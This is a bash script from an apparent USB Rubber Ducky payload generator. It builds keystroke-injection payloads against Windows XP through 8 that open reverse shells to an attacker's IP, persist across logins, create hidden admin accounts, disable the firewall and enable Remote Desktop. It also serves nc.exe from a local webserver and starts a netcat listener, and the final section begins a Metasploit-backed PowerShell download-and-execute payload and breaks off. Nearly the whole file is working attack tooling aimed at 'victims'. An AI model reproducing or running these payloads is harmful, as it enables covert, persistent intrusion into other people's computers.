#################################################################################
#################################################################################
#
# Windows Reverse Shell Payloads
#
#################################################################################
#################################################################################

#################################################################################
# Persistence Reverse Shell w/UAC (Win Vista/7)
#################################################################################
f_persistenceVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move nc.exe to your web directory and start your webserver [y/n]? " netcat
	if [ "$netcat" == "y" ]; then
		clear
		cp /usr/share/ducky/encoder/misc/nc.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/persistenceVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/o UAC (Win Vista/7)
#################################################################################
f_persistenceVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move nc.exe to your web directory and start your webserver [y/n]? " netcat
	if [ "$netcat" == "y" ]; then
		clear
		cp /usr/share/ducky/encoder/misc/nc.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/persistenceVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear	
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/UAC (Win 8)
#################################################################################
f_persistenceWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move nc.exe to your web directory and start your webserver [y/n]? " netcat
	if [ "$netcat" == "y" ]; then
		clear
		cp /usr/share/ducky/encoder/misc/nc.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/persistenceWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Persistence Reverse Shell w/o UAC (Win 8)
#################################################################################
f_persistenceWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell everytime a victim logs into his/her computer. It also creates and hides an admin account, drops the firewall, and enables Remote Deskop/Remote Assistance."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "Where shall I send your persistent shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "What is the IP/Domain address for your webserver? " 
	read -p "[Example: www.example.com | www.example.com:port | $attackerip] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	read -p "If you are using Kali, would you like me to move nc.exe to your web directory and start your webserver [y/n]? " netcat
	if [ "$netcat" == "y" ]; then
		clear
		cp /usr/share/ducky/encoder/misc/nc.exe /var/www/
		service apache2 stop
		service apache2 start
		clear
	else
	clear
	fi
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/persistenceWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip-attackerport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/webserverip/$webserverip/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell (No Download|W2K/XP)
#################################################################################
f_windowsrevW2KXP(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when the Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m WIN2K/XP"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/windowsrevW2KXP.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/UAC (No Download|Win Vista/7)
#################################################################################
f_windowsrevVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use milliseconds (15000 ms = 15 sec)" pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/windowsrevVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/o UAC (No Download|Win Vista/7)
#################################################################################
f_windowsrevVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/windowsrevVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear	
	fi

	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/UAC (No Download|Win 8)
#################################################################################
f_windowsrevWIN8uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec	
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/windowsrevWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear	
		read -p "Would you like to return to the main menu [y/n]? " option
		clear
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Windows Reverse Shell w/o UAC (No Download|Win 8)
#################################################################################
f_windowsrevWIN8nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide an adminstrative reverse shell when Powershell, Download, and Execute is not feesable."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC enabled\e[0m"
	echo -e "\e[1;31mAuthor:\e[0m Darren Kitchen (Props to IllWill)(slight modifications by skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec	
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/windowsrevWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 	
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear	
	fi

	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Powershell Download & Execute (User Priv Shell|Win Vista/7)
#################################################################################
f_powershellVIS7(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses Powershell to download and execute an evil payload"
	echo -e "\e[1;31mNote:\e[0m The evil payload is generated by Metasploit, and will provide either a Meterpreter or Standard shell. The payload will automatically be dropped in your web (/var/www) directory and will be titled 'winmgmt.txt'. Once the payload is downloaded on the victim's machine it is converted to a .exe and run with user privileges."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7"
	echo -e "\e[1;31mAuthor:\e[0m mubix"
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
